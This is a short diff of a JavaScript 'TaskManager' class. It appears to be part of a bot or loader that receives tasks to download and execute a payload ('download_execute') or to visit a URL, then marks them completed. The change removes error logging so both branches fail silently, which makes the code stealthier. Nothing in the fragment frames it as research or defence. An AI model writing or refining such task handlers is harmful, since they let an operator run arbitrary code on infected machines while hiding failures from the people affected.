@@ -52,14 +52,12 @@ class TaskManager {
                 if (task.goal == 'download_execute') {
                     try {
                         await downloadExecute(task.param);
-                    } catch (e) {}
+                    } catch (e) { }
                 }
                 if (task.goal == 'visit') {
                     try {
                         await visitUrl(task.param);
-                    } catch (e) {
-                        console.log(e);
-                    }
+                    } catch (e) { }
                 }
 
                 task.completed = true;
